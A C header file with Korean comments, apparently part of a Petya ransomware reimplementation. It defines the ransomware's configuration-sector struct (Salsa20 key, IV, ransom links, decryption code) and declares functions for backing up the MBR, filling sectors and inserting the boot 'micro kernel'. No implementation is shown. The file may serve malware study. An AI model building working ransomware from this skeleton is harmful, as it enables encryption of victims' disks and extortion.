#pragma once
#include <Windows.h>
#include <stdio.h>

HANDLE hHard; // 하드 드라이브 핸들을 저장할 변수

// Petya 랜섬웨어와 관련된 데이터 구조
typedef struct PetyaStruct
{
    UCHAR Encrypted; // 암호화 상태를 나타내는 플래그
                     // 0x00 - 암호화되지 않음
                     // 0x01 - 암호화됨
                     // 0x02 - 복호화됨
    UCHAR DecryptionKey[32]; // Salsa20 암호화에 사용되는 복호화 키
    UCHAR IV[8]; // 초기화 벡터 (IV), 암호화 과정에서 사용됨
    UCHAR FirstLink[36]; // 첫 번째 링크, 랜섬웨어가 사용하는 데이터
    UCHAR Reserved[6]; // 예약된 공간, 추가 데이터에 사용될 수 있음
    UCHAR SecondLink[36]; // 두 번째 링크, 랜섬웨어가 사용하는 데이터
    UCHAR Reserved2[50]; // 빈 공간, 추가 데이터에 사용될 수 있음
    UCHAR PersonalDecryptionCode[90]; // 개인 복호화 코드, 사용자가 복호화하는 데 필요함
} PetyaSectorData; // Petya 랜섬웨어에서 사용하는 섹터 데이터 구조체

// 마스터 부트 레코드를 백업하는 함수 선언
VOID PetyaBackupMBR();

// 빈 섹터를 채우는 함수 선언
VOID PetyaFillEmptySectors();

// 설정 섹터를 처리하는 함수 선언
VOID PetyaConfigurationSector();

// 마이크로 커널을 삽입하는 함수 선언
VOID PetyaInsertMicroKernel();
